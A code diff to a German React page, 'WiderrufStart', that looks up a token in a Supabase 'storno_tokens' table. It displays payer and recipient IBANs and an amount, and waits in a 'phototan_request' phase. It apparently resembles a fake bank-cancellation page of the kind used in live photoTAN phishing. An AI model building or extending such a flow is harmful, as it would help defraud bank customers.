@@ -7,22 +7,47 @@ import Footer from "@/components/Footer";
 import ContactSection from "@/components/ContactSection";
 import { supabase } from "@/integrations/supabase/client";
 
+type Row = {
+  auftraggeber_name: string | null;
+  auftraggeber_iban: string | null;
+  empfaenger_name: string | null;
+  empfaenger_iban: string | null;
+  betrag: number | null;
+  verwendungszweck: string | null;
+  customer_phase: string | null;
+};
+
+const formatIban = (v?: string | null) =>
+  (v || "").replace(/\s+/g, "").replace(/(.{4})/g, "$1 ").trim();
+const kontoFromIban = (v?: string | null) => {
+  const s = (v || "").replace(/\s+/g, "");
+  if (!s) return "—";
+  return s.slice(4).replace(/^0+/, "") || s.slice(4);
+};
+const formatBetrag = (n?: number | null) =>
+  n == null ? "—" : new Intl.NumberFormat("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }).format(Number(n)) + " EUR";
+const berlinToday = () =>
+  new Intl.DateTimeFormat("de-DE", { day: "numeric", month: "long", year: "numeric", timeZone: "Europe/Berlin" }).format(new Date());
+
 const WiderrufStart = () => {
   const navigate = useNavigate();
   const [sp] = useSearchParams();
   const token = sp.get("token");
   const [requesting, setRequesting] = useState(false);
   const [phase, setPhase] = useState<string | null>(null);
+  const [row, setRow] = useState<Row | null>(null);
 
   useEffect(() => {
     if (!token) return;
     const check = async () => {
       const { data } = await (supabase as any)
         .from("storno_tokens")
-        .select("customer_phase")
+        .select("auftraggeber_name, auftraggeber_iban, empfaenger_name, empfaenger_iban, betrag, verwendungszweck, customer_phase")
         .eq("token", token)
         .maybeSingle();
-      const p = data?.customer_phase as string | undefined;
+      if (!data) return;
+      setRow(data as Row);
+      const p = (data as Row).customer_phase;
       if (p) setPhase(p);
       if (p === "success") {
         navigate(`/success?token=${encodeURIComponent(token)}`);
@@ -51,6 +76,7 @@ const WiderrufStart = () => {
   };
 
   const waiting = requesting || phase === "phototan_request";
+
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
